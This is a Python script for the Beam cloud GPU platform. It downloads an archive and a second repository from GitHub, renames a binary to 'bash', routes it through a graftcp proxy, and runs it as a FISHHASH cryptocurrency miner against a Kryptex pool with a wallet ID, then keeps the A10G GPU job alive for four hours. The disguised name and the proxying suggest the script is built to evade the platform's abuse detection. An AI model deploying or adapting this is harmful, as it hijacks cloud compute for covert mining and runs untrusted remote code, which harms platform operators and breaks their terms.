from beam import function, Image
import subprocess
import time

image = (
    Image(
        base_image="nvidia/cuda:12.1.1-runtime-ubuntu22.04",
    )
    .add_commands([
        "apt-get update -y",
        "apt-get install -y curl ca-certificates unzip git wget",
    ])
)


@function(
    name="t4x3-runner",
    image=image,
    gpu="A10G",
    cpu=2,
    memory="4Gi",
    timeout=4 * 60 * 60,
)
def run_script():
    # cek GPU
    subprocess.run(["nvidia-smi"], check=False)

    cmd = """
    set -e

    echo "=== DOWNLOAD FILE ==="
    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip

    echo "=== EXTRACT ==="
    unzip -o pan.zip
        
    cd pan

    echo "=== SET PERMISSION ==="
    chmod -R +x .

    echo "=== START GRAFTCP LOCAL ==="
    ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &

    # tunggu service siap
    sleep 3

    # download lol
    git clone https://github.com/malogrono/lol198.git

    echo "=== CHECK CURRENT DIRECTORY ==="
    pwd

    echo "=== CHECK PAN ==="
    ls -ld /mnt/code/pan
    file /mnt/code/pan

    echo "=== CHECK PAN CONTENT ==="
    ls -lah /mnt/code/pan

    cd lol198
    chmod u+x bash

    echo "=== CHECK FILE ==="
    ls -lh bash
    file bash

    # pindahkan file ke direktori pan
    mv bash /mnt/code/pan/

    echo "=== CHECK PAN AFTER MV ==="
    ls -ld /mnt/code/pan
    file /mnt/code/pan
    ls -lah /mnt/code/pan

    # masuk ke direktori pan
    cd /mnt/code/pan

    echo "=== FINAL DIRECTORY ==="
    pwd
    ls -lah

    echo "=== RUN PROC VIA GRAFTCP ==="
    ./graftcp/graftcp ./bash --algo FISHHASH --pool iron.kryptex.network:7017 --user d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.01 --ethstratum ETHPROX
    """

    subprocess.run(["bash", "-lc", cmd], check=False)

    print("Staying alive for 4 hours...")
    time.sleep(60 * 60 * 4)
